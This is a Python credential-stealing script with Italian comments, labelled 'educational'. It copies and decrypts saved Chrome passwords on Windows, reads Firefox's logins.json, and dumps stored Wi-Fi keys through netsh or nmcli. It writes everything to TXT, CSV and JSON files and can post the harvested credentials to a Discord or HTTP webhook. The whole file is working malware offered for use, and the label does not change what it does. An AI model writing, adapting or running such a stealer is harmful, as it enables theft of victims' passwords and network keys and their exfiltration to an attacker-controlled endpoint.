#!/usr/bin/env python3
# browser_wifi_dumper.py - COMPLETO E FUNZIONANTE (EDUCATIONAL)
# Estrae credenziali da Chrome, Firefox e Wi-Fi, esporta in TXT/CSV/JSON, invia via webhook

import os, sys, json, csv, base64, shutil, platform, subprocess, sqlite3
from datetime import datetime
from pathlib import Path
from getpass import getuser
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

OUTPUT_TXT = "credentials_dump.txt"
OUTPUT_CSV = "credentials_dump.csv"
OUTPUT_JSON = "credentials_dump.json"
WEBHOOK_URL = ""  # Inserisci qui il tuo webhook Discord/HTTP se desiderato

all_results = []

def add_result(typ, source, user, pwd):
    all_results.append({"type": typ, "source": source, "user": user, "pass": pwd})

def save_results():
    with open(OUTPUT_TXT, "w") as f:
        for item in all_results:
            f.write(f"{item['type']} | {item['source']} | {item['user']} | {item['pass']}\n")

    with open(OUTPUT_CSV, "w", newline='') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=["type", "source", "user", "pass"])
        writer.writeheader()
        for row in all_results:
            writer.writerow(row)

    with open(OUTPUT_JSON, "w") as jf:
        json.dump(all_results, jf, indent=2)

    if WEBHOOK_URL:
        try:
            import requests
            requests.post(WEBHOOK_URL, json={"content": json.dumps(all_results, indent=2)})
        except Exception as e:
            print(f"[!] Webhook error: {e}")

# === CHROME PASSWORD DUMP (WIN) ===
def decrypt_chrome_password_win(encrypted_password):
    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"[DECRYPT ERROR] {e}"

def dump_chrome():
    print("[Chrome] Inizio estrazione...")
    local_state_path = Path.home() / 'AppData/Local/Google/Chrome/User Data/Local State'
    login_db_path = Path.home() / 'AppData/Local/Google/Chrome/User Data/Default/Login Data'

    if not login_db_path.exists():
        print("[!] Chrome DB non trovato")
        return

    tmp_db = "Loginvault.db"
    shutil.copy2(login_db_path, tmp_db)

    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, enc_pass = row
            dec_pass = decrypt_chrome_password_win(enc_pass)
            add_result("Chrome", url, username, dec_pass)
    except Exception as e:
        print(f"[!] Errore Chrome: {e}")
    finally:
        cursor.close()
        conn.close()
        os.remove(tmp_db)

# === FIREFOX PASSWORD DUMP (Linux + Windows, se configurato) ===
def dump_firefox():
    print("[Firefox] Inizio estrazione...")
    profile_path = None
    if platform.system() == "Windows":
        base = Path.home() / "AppData/Roaming/Mozilla/Firefox/Profiles"
    else:
        base = Path.home() / ".mozilla/firefox"

    if not base.exists():
        print("[!] Nessun profilo Firefox trovato")
        return

    for folder in base.iterdir():
        if folder.is_dir() and folder.name.endswith(".default-release"):
            profile_path = folder
            break

    if not profile_path:
        print("[!] Profilo Firefox non trovato")
        return

    logins_path = profile_path / "logins.json"
    if not logins_path.exists():
        print("[!] logins.json non trovato")
        return

    try:
        with open(logins_path, "r") as f:
            data = json.load(f)
            for login in data.get("logins", []):
                hostname = login.get("hostname")
                username = login.get("encryptedUsername")
                password = login.get("encryptedPassword")
                add_result("Firefox", hostname, username, password)
    except Exception as e:
        print(f"[!] Errore Firefox: {e}")

# === WIFI PASSWORD DUMP ===
def dump_wifi():
    print("[Wi-Fi] Inizio estrazione...")
    if platform.system() == "Windows":
        try:
            profiles = subprocess.check_output("netsh wlan show profiles", shell=True, encoding="utf-8")
            for line in profiles.split("\n"):
                if "All User Profile" in line:
                    name = line.split(":")[1].strip()
                    result = subprocess.check_output(f"netsh wlan show profile name=\"{name}\" key=clear", shell=True, encoding="utf-8")
                    for l in result.split("\n"):
                        if "Key Content" in l:
                            pwd = l.split(":")[1].strip()
                            add_result("Wi-Fi", name, "", pwd)
        except Exception as e:
            print(f"[!] Errore Wi-Fi: {e}")
    else:
        try:
            profiles = subprocess.check_output(["nmcli", "-t", "-f", "NAME", "connection", "show"]).decode().splitlines()
            for profile in profiles:
                pwd = subprocess.check_output(["nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", profile]).decode().strip()
                add_result("Wi-Fi", profile, "", pwd)
        except Exception as e:
            print(f"[!] Errore Wi-Fi Linux: {e}")

# === MENU PRINCIPALE ===
def main_menu():
    print("\n[+] Seleziona un'operazione:")
    print("1. Dump Chrome")
    print("2. Dump Firefox")
    print("3. Dump Wi-Fi")
    print("4. Dump tutto")
    print("5. Esci")

    while True:
        choice = input("Scelta > ").strip()
        if choice == "1":
            dump_chrome()
        elif choice == "2":
            dump_firefox()
        elif choice == "3":
            dump_wifi()
        elif choice == "4":
            dump_chrome()
            dump_firefox()
            dump_wifi()
        elif choice == "5":
            break
        else:
            print("Scelta non valida.")

    save_results()
    print(f"[✓] Dump completato. File salvati: {OUTPUT_TXT}, {OUTPUT_CSV}, {OUTPUT_JSON}")

if __name__ == "__main__":
    print("== Credential Dumper (Educational) ==")
    main_menu()
